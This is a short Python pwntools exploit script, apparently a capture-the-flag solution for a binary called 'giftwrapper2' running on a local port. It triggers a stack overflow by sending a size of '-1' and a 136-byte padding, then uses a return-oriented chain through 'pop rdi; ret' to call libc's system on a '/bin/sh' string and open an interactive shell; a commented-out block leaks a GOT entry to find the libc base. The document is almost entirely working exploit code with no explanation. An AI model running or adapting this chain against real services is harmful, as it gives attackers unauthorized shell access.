from pwn import *

libc_name = "/lib/x86_64-linux-gnu/libc.so.6" #"./libc-2.26.so"
target_name = "./giftwrapper2.so"
libc = ELF(libc_name)
target = ELF(target_name)

ret = 0x400bce
popret = 0x400e18
pop_rdi_ret = 0x40154F+1
pop_rsi_r15_ret = 0x040154D+1

def exploit(payload):
	print "111"
	print r.recv()
	r.sendline("wrap")
	print r.recv()
	r.send("-1")
	print r.recv()
	r.send(payload)

r = remote("0", 12345)
raw_input()
print r.recv()
r.sendline("aaaaaaaaaaaaaaaa/bin/sh")
print r.recv()
r.sendline("modinfo")
print r.recvuntil("Base address: 0x")
code_base = int(r.recvline()[:-1], 16)
log.info("code base 0x%x" % code_base)

libc_base = 0x7fe627c5c000
system = libc_base + libc.symbols['system']

payload = "a"*136
payload += p64(pop_rdi_ret)
payload += p64(0x602170)
payload += p64(system)
exploit(payload)
"""
payload = "a" * 136
payload += p64(pop_rdi_ret)
payload += p64(code_base + target.got['puts'])
payload += p64(code_base + target.plt['puts'])
payload += p64(pop_rsi_r15_ret)
exploit(payload)

print r.recvuntil("so beautiful\n")
leak = u64(r.recvline()[:-1].ljust(8,"\x00"))
libc_base = leak - (0x7fe627ccb690-0x7fe627c5c000)
log.info("leak : 0x%x" % leak)
log.info("libc base : 0x%x" % libc_base)
"""



r.interactive()
